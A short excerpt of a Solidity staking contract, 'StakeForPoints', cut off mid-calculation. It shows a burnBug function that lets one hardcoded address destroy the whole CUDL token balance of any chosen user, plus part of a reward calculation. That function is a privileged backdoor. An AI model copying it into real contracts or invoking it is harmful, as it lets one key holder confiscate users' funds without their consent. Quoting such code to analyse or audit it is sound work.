...
contract StakeForPoints is Initializable, AccessControlUpgradeable {
    ...
    function burnBug(address _who) external {
        require(
            msg.sender == address(0x4B5922ABf25858d012d12bb1184e5d3d0B6D6BE4)
        );
        IToken(cudl).burnFrom(
            address(_who),
            IToken(cudl).balanceOf(address(_who))
        );
    }
    ...
    function earned(address account) public view returns (uint256) {
        ...
        for (uint256 i; i < lpTokens.length; i++) {
            _earned += balanceByPool[i][account]
                .mul(
                    timeElapsed.mul(2314814814814).mul(10000).div(
